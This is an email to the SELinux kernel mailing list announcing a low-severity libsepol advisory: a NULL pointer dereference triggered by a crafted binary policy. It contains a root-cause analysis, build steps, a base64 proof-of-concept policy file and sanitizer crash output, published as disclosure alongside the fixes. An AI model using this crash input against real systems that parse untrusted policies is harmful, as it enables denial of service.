Received: from mail-ot1-f53.google.com (mail-ot1-f53.google.com [209.85.210.53])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 640A23D9DBD
	for <selinux@vger.kernel.org>; Mon, 10 Aug 2026 12:40:36 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.210.53
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1786365638; cv=pass; b=TGwLYs2Q2ZcFAeCQTjCKSUxDjfvnTKQnzfYP9YbFZQaa6rBCYfEnYGHjRN7Y/hDyqeG6PkDcjJWtDIg/fA6HwACJ8zrT3ILejVHM+kA1vziRpfujtdDlpACJ8/bWghte8PCX/U1FxmsdwMFpDxmRv2vDtVFuGwe8hjYF5GkIcBc=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1786365638; c=relaxed/simple;
	bh=8hi3Ojg5J+JEvGdqq8VfWaUqw2lZNc4z17v9tkvKR2A=;
	h=MIME-Version:From:Date:Message-ID:Subject:To:Cc:Content-Type; b=Yvn3GQrDvqMC1tyZyh1EzN0DdzzblOCMrwG+AI4u1F4zf1a+7Kd6v+N+wnGaxM62UH3RfrgVogAy2OsdHHnD3xSV/xy6yQn59gnhmYDCQuQok8H/DdH8oMY7YcodaPSO6G6Bduxa+rrzhAucdi9VYwk7v/f5XPS0Fi8cOuqwO8w=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com; spf=pass smtp.mailfrom=gmail.com; dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b=HPw+G5R5; arc=pass smtp.client-ip=209.85.210.53
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=gmail.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=gmail.com
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=gmail.com header.i=@gmail.com header.b="HPw+G5R5"
Received: by mail-ot1-f53.google.com with SMTP id 46e09a7af769-7eb34c17b96so1355303a34.2
        for <selinux@vger.kernel.org>; Mon, 10 Aug 2026 05:40:36 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1786365635; cv=none;
        d=google.com; s=arc-20260327;
        b=XQemOmTnciep8umTvqoXVHKXvJURy0XTGB2msu3NPlmqlfRQ2MS9L60c8kpxM9dZGJ
         T07Jkfm5UuomAArXC/37nS+nYFVnSMBbvitMdZlIeItwH2SujsAIZnp6YauTjLSnONH2
         9kwVsVPVCN/gKcm99NoYApgtV6TGKCBrwjTwrBSL4Ub4VSZds6owmVG4ulQg0u568X5r
         70Xo0Uy/wbEnEJJFExwsWPCe1lED56UP4KVldNiM1Z7jQo+nY/H+RGRdJyfHtbmP2bRu
         glLxWsKtmER5evCMRzZNfve194a3pYLzPMLedodF7b8a0YOnv8ercIxM2wNierW2sq4c
         3Y9A==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20260327;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :mime-version:dkim-signature;
        bh=dm4eA15qUC3LgeBnUeCEoC2QVNZZv5u2MbhperBz7iE=;
        fh=3TBeGByRciDK7tkdJhxM4hdyFwJyGsKQIjrmSEZKcUc=;
        b=peexmDqSE6lQdsh9ZJXF1QZFAYv+eb6nwYA83h+hbQSDkZHlPXsvoosNQLkW98I23B
         JDqSBgjFPVguFQ/NwE4EeLEPE3UIQDrfDhY6sPpAqb+tLMDY737fIbgSAjT7EJYI3jR7
         qp//l0kPkwZ8PfB0wVHIVtOllPX8+WmpVBSMINT6g8A9mh6GFuhWMTlwu3YxTv7mAR4j
         4IagXrWo8cvlZdJ6qxOrlhtJU03aJ75twS0hmRyff734DMcn6jPqjwWlgBq7YJiLOoRj
         htfOrs0mAHNGENcz/VZ1TsBuMRDuCELYonBe1I9TQ9itgdrFwfIztR4b29xU8UkUJ8U9
         +bDw==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20251104; t=1786365635; x=1786970435; darn=vger.kernel.org;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:mime-version:from:to:cc:subject:date:message-id:reply-to
         :content-type;
        bh=dm4eA15qUC3LgeBnUeCEoC2QVNZZv5u2MbhperBz7iE=;
        b=HPw+G5R5qSg3IGtnhATH52Z7sDlThbGmaHVUwWVn+bYG1KpJOoBoSn43o0p1d5GNBV
         NirYHElDUzaxURq/KsUw912pqc/1ah1dRDEupDnLl/b1v9o1eCAn28e/xt6COFt8yaTL
         /55kj6Ku3C37yrkC7DLQeBcIYedRNc2yiJpXGYwCg/XaA1su5gp2VSkDvap/ml+l58BF
         1ZZs867eTgXO1+BkXSv9MrsRrmMCgp5cj49Z/hhVgD7PpOpz+lWZ/FPZJ0ZoyrRTrOH4
         wYgmNAU3b97YG41E+OBLykUhBuXZKPMTd6eQLIPDNghqYh7uBcVGnMRtoyq2m4xVyt/l
         WLtg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1786365635; x=1786970435;
        h=content-transfer-encoding:content-type:cc:to:subject:message-id
         :date:from:mime-version:x-gm-gg:x-gm-message-state:from:to:cc
         :subject:date:message-id:reply-to:content-type;
        bh=dm4eA15qUC3LgeBnUeCEoC2QVNZZv5u2MbhperBz7iE=;
        b=UCUu9GxULuLTHfucwA7RNfIhww19q8gaZnEu++XaUq8onPbv/L2tkhKwcajnJOIrJS
         kPSFriegI+jiZOftQbn3mulUVxvIlwLOcyIYZjtKgTT0RUwKvqpglvD9p9UWB8AYAR92
         /Mvsvug8omxlY1Kc9LuFDZFINWJlt29HQ+Eu42GS2UBQ+mHahuYfs35yAnau8Gmw4vX0
         wKAwYnBi+a5qIP47+VvTjJZnfssj4o86voLLaL967l7oRNzjTfmLAUYWkLyrK1au905k
         699lqkAKtnSuDWMWgeEpUmqisE4KFzPEm8mWb/5L1L1HYWaeebAAsYWMSpO6xjoI9rUw
         4Rhg==
X-Gm-Message-State: AOJu0YxT6V9YlALUzKZYLX6NOIkmFyiJbroUC0Q2JlPtNL1HeFQ7oCSE
	MFc9tpH7XCbS+khXVuUjMK4WNhiyzPTO88x4PK08jU2FBj6EaeYxBfuiCi2ZlxIFZY7qmqhsYD+
	fhLrRX5+2mzC91aZUs0aEQFVuqcj2rrAT/9EO
X-Gm-Gg: AR+sD13ZzId7j77nin9/OIZZ6oNHHMyR5QkBsmfxBY0GVjPA3h1Q63BViE1z4W6xmxV
	kXFzQGQX82MrZSKesrsR9oIn+O9ivm+iB4XO0yZSxHaqSRk8bNBgdc1P9WNzhqnuUylWRVP4Dw6
	oCDNIzCbmViIWAMQIsYvCPRIsJm2qm18bnHbQrnAXDB3LW79n2YeBRAB2AJoDk8tGgaHpNYhINS
	TgS4MKtiVhBDncLEDBOcAQkbzhyOi/xD7/W/OKbjxR1I/aH05fQnqw4ho0YcVd4ksYZaYIG7yzC
	i8KUhXzNmgYWt79yamBsi93lDCpb9onPrWUItXUsDYVqNxfr3ONDK7c=
X-Received: by 2002:a05:6830:7306:b0:7dc:c4ae:a679 with SMTP id
 46e09a7af769-7f39a940fe4mr804922a34.9.1786365635049; Mon, 10 Aug 2026
 05:40:35 -0700 (PDT)
Precedence: bulk
X-Mailing-List: selinux@vger.kernel.org
List-Id: <selinux.vger.kernel.org>
List-Subscribe: <mailto:selinux+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:selinux+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
From: Stephen Smalley <stephen.smalley.work@gmail.com>
Date: Mon, 10 Aug 2026 08:40:24 -0400
X-Gm-Features: AUfX_my8z_zlWAIfPCSsmC6JlSlMATUJdimgeCkDXOjHkFQblrpY8oj8cYsWbgU
Message-ID: <CAEjxPJ51pv-Q02SKEa0T=6zwp_hZkMV-4XCAuD_c+pNnLgkWBw@mail.gmail.com>
Subject: SECURITY: libsepol <= 3.11: NULL pointer dereference in
 `hierarchy_add_type_callback` via crafted binary policy (POLICY_KERN versions 20-23)
To: SElinux list <selinux@vger.kernel.org>
Cc: Chen Gong <reister@ruc.edu.cn>
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable

A new externally submitted security advisory from Chen Gong has been
published at:
https://github.com/SELinuxProject/selinux/security/advisories/GHSA-r6m6-f5m=
x-4g63

While we did fix the underlying bugs and published the advisory, this
issue requires attacker-controlled policy and further does not affect
any production policy consumers to our knowledge. Once we merge the
pending update to SECURITY.md that clarifies our policy about such
bugs, we will not accept future security advisories of this nature;
please just post such issues to the list as regular bug reports. We
have not requested a CVE for this bug.

Some details are included below but please use the link above to see
the latest info since it may be updated later.

Summary
A NULL pointer dereference in libsepol/src/hierarchy.c:669 causes a
SIGSEGV when hierarchy_check_constraints() processes a crafted SELinux
binary policy with POLICY_KERN version 20-23. A type entry with
primary=3D0 creates a NULL gap in p_type_val_to_name[], which is then
passed to strrchr() =E2=80=94 a function whose first parameter is declared
nonnull.

Affected version: libsepol 3.11 (tag libsepol-3.11), also confirmed on
main branch (same code)
Vulnerability type: CWE-476 (NULL Pointer Dereference)
Root Cause
Three code paths interact to create the vulnerability:

1. type_index() skips non-primary types (policydb.c:1112)

static int type_index(hashtab_key_t key, hashtab_datum_t datum, void *datap=
)
{
    ...
    if (typdatum->primary) {          // only indexes primary types
        ...
        p->p_type_val_to_name[typdatum->s.value - 1] =3D (char *)key;
        p->type_val_to_struct[typdatum->s.value - 1] =3D typdatum;
    }
    return 0;
}
Types with primary=3D0 are not indexed =E2=80=94 their entries in
p_type_val_to_name[] remain NULL. But they are still present in the
p_types.table hashtab.

2. validate_array_init() skips gap checking for versions 20-23
(policydb_validate.c:73-87)

if (p->policy_type !=3D POLICY_KERN ||
    p->policyvers < POLICYDB_VERSION_AVTAB ||
    p->policyvers > POLICYDB_VERSION_PERMISSIVE) {
    if (validate_init(&flavors[SYM_TYPES], p->p_type_val_to_name,
                      p->p_types.nprim))
        goto bad;
} else {
    // versions 20-23: gaps treated as empty
    flavors[SYM_TYPES].nprim =3D p->p_types.nprim;
    ebitmap_init(&flavors[SYM_TYPES].gaps);  // empty gaps bitmap
}
For POLICY_KERN versions 20-23, NULL entries in p_type_val_to_name are
not flagged as invalid, so policydb_validate() does not reject the
policy.

3. hierarchy_add_type_callback dereferences NULL without check
(hierarchy.c:634-669)

if (!datum->bounds) {
    datum_name =3D
        p->p_type_val_to_name[datum->s.value - 1];   // can be NULL

    tmp =3D strrchr(datum_name, '.');                   // CRASH: NULL
passed to nonnull
    ...
}
hierarchy_add_bounds() calls hashtab_map(p->p_types.table,
hierarchy_add_type_callback, ...), which iterates all types in the
hashtab =E2=80=94 including non-primary types with NULL val_to_name entries=
.

Call chain
LLVMFuzzerTestOneInput (binpolicy-fuzzer.c:60)
  =E2=94=94=E2=94=80 hierarchy_check_constraints (hierarchy.c:708)
       =E2=94=94=E2=94=80 hierarchy_add_bounds (hierarchy.c:689)
            =E2=94=94=E2=94=80 hashtab_map (hashtab.c:245)
                 =E2=94=94=E2=94=80 hierarchy_add_type_callback (hierarchy.=
c:669)
                      =E2=94=94=E2=94=80 strrchr(NULL, '.')  =E2=86=90 SIGS=
EGV
PoC
A 495-byte crafted SELinux binary policy file. The key is a type entry
with primary=3D0, value=3D2, and name "parent.child" (the dot ensures
strrchr is called rather than returning early).

Reproduction
Build libsepol with ASAN+UBSan and the fuzzer harness from
libsepol/fuzz/binpolicy-fuzzer.c. The fuzzer harness uses
LLVMFuzzerTestOneInput which expects a buffer; we need a file-based
entry.c wrapper to read from a file:

entry.c (file-based LLVMFuzzerTestOneInput wrapper):

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

extern int LLVMFuzzerTestOneInput(const uint8_t *data, size_t size);

int main(int argc, char **argv) {
    if (argc !=3D 2) {
        fprintf(stderr, "usage: %s <file>\n", argv[0]);
        return 2;
    }
    FILE *f =3D fopen(argv[1], "rb");
    if (!f) { perror("fopen"); return 2; }
    fseek(f, 0, SEEK_END);
    long sz =3D ftell(f);
    fseek(f, 0, SEEK_SET);
    if (sz < 0) { fclose(f); return 2; }
    uint8_t *buf =3D malloc((size_t)sz > 0 ? (size_t)sz : 1);
    if (!buf) { fclose(f); return 2; }
    fread(buf, 1, (size_t)sz, f);
    fclose(f);
    LLVMFuzzerTestOneInput(buf, (size_t)sz);
    free(buf);
    return 0;
}
# Build libsepol
git clone --depth 1 --branch libsepol-3.11
https://github.com/SELinuxProject/selinux.git
cd selinux/libsepol
make -C src CC=3Dgcc \
    CFLAGS=3D"-O1 -g -fsanitize=3Daddress,undefined
-fno-omit-frame-pointer -I. -I../include -D_GNU_SOURCE" \
    LDFLAGS=3D"-fsanitize=3Daddress,undefined" libsepol.a

# Build fuzzer (binpolicy-fuzzer.c + entry.c wrapper)
gcc -O1 -g -fsanitize=3Daddress,undefined -fno-omit-frame-pointer \
    -I include -I src \
    -c fuzz/binpolicy-fuzzer.c -o binpolicy-fuzzer.o
gcc -O1 -g -fsanitize=3Daddress,undefined -fno-omit-frame-pointer \
    -I include -I src \
    -c entry.c -o entry.o
gcc -fsanitize=3Daddress,undefined -o fuzzer \
    binpolicy-fuzzer.o entry.o src/libsepol.a -lm -ldl -lpthread

# Run PoC
ASAN_OPTIONS=3D"detect_leaks=3D0" ./fuzzer poc.bin
PoC file
The PoC is a 495-byte crafted SELinux binary policy file (POLICY_KERN
version 23, MLS enabled). Save the following base64 as poc.bin:

echo 'jP98+QgAAABTRSBMaW51eBcAAAABAAAACAAAAAcAAABAAAAAAAAAAAAAAABAAAAAAAAAA=
AAAAAAAAAAAAAAAAAEAAAABAAAABgAAAAAAAAABAAAAAQAAAAEAAAAAAAAAY2xhc3MxBQAAAAEA=
AABwZXJtMQAAAAABAAAAAQAAAAgAAAABAAAAb2JqZWN0X3JAAAAAAAAAAAAAAABAAAAAAAAAAAA=
AAAACAAAAAgAAAAUAAAABAAAAAQAAAHR5cGUxDAAAAAIAAAAAAAAAcGFyZW50LmNoaWxkAQAAAA=
EAAAAFAAAAAQAAAHVzZXIxQAAAAEAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAEAAABAAAAAAAAAA=
AAAAAABAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAABAAAAAQAAAAIAAAAAAAAAczABAAAAQAAAAAAA=
AAAAAAAAAAAAAAAAAAABAAAAAQABAAEAAQABAAAAAAAAAAAAAAAAAAAAAQAAAAEAAAABAAAAAQA=
AAAEAAAABAAAAAQAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
AAQAAAAEAAAAABAAAAAAAAAAEAAAAAAAAAQAAAAEAAAAABAAAAAAAAAAIAAAAAAAAA'
| base64 -d > poc.bin
The key structure: a POLICY_KERN version 23 policy with 2 types =E2=80=94
type1 (primary=3D1, value=3D1) and parent.child (primary=3D0, value=3D2). T=
he
primary=3D0 type is not indexed by type_index(), creating a NULL gap in
p_type_val_to_name[1]. The name "parent.child" contains a dot,
ensuring strrchr() is called rather than returning early.

Crash output
hierarchy.c:669:8: runtime error: null pointer passed as argument 1,
which is declared to never be null
AddressSanitizer:DEADLYSIGNAL
=3D=3DERROR: AddressSanitizer: SEGV on unknown address 0x000000000000
The signal is caused by a READ memory access.
Hint: address points to the zero page.
    #0 in __sanitizer::internal_strlen
    #1 in strrchr
    #2 in hierarchy_add_type_callback hierarchy.c:669
    #3 in hashtab_map hashtab.c:245
    #4 in hierarchy_add_bounds hierarchy.c:689
    #5 in hierarchy_check_constraints hierarchy.c:708
    #6 in LLVMFuzzerTestOneInput binpolicy-fuzzer.c:60

SUMMARY: AddressSanitizer: SEGV
Exit code: 1
Impact
Severity: Low =E2=80=94 DoS crash, not memory corruption
Attack surface: Any application using libsepol to parse and validate
untrusted binary policy files via sepol_policydb_read() +
hierarchy_check_constraints(), potentially indirectly via
expand_module(). No known production users are affected.
Affected policy versions: POLICY_KERN versions 20-23
Notes: Exploiting this bug requires attacker-controlled policy and
does not appear to be reachable from any SELinux userspace tools.
checkpolicy and checkmodule never call the vulnerable function on a
caller-provided binary policy file. semodule_expand only accepts
binary policy modules as input, not kernel policies. setools does not
call the vulnerable function. Runtime policy consumers are not
affected.
Environment
libsepol version: 3.11 (tag libsepol-3.11), confirmed reproducible on
main branch
Compiler: gcc 14, -O1 -g -fsanitize=3Daddress,undefined -fno-omit-frame-poi=
nter
Fuzzer harness: binpolicy-fuzzer.c from libsepol/fuzz/
poc.zip
Patches
Fixed via commit 208cea1 and support for the vulnerable policy
versions were entirely removed via commit 3394f1a, to be included in
libsepol 3.12 and later.

Workarounds
Not directly reachable by any production users of libsepol. Although
checkpolicy, checkmodule, and semodule_expand do call expand_module()
and/or hierarchy_check_constraints(), they do not call them for any
kernel binary policy that they didn't generate themselves.
